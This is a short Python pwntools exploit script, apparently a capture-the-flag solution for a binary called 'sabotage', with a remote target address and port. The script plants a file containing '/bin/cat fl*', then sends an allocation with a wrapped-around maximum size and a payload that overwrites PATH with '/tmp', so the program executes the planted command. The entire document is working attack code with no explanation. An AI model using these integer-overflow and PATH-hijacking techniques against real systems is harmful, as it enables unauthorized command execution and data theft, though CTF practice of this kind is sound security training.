#!/usr/bin/env python3

from pwn import *

the_binary = "./sabotage"
context.binary = the_binary
elf = context.binary
libc = ELF("./glibc/libc.so.6", checksec=False)

context.terminal = ["tmux", "splitw", "-v"]

if args.REMOTE:
    io = remote("104.248.162.86", 32512)
elif args.STRACE:
    io = process(["strace", "-o", "strace.txt", the_binary])
else:
    io = process(the_binary)

if args.GDB:
    gdb.attach(io, """
        continue
    """)

def choice(num):
    io.sendlineafter(b"> ", str(num).encode())

def index(idx):
    io.sendafter(b"Number of order: ", str(idx).encode())

def alloc(data, sz=None):
    if sz is None:
        sz = len(data)
    else:
        assert len(data) <= sz

    choice(1)
    io.sendlineafter(b"length: ", str(sz).encode())
    io.sendlineafter(b"code: ", data)

def quantum(filename, data):
    assert "." not in filename and "/" not in filename
    assert len(filename) <= 8
    assert len(data) <= 0x20

    choice(2)
    io.sendlineafter(b"point: ", filename.encode())
    io.sendlineafter(b"shield: ", data)

quantum("panel", "/bin/cat fl*")
alloc(b"B"*0x20 + b"PATH=/tmp", sz=(0xffffffffffffffff-7))

io.interactive()
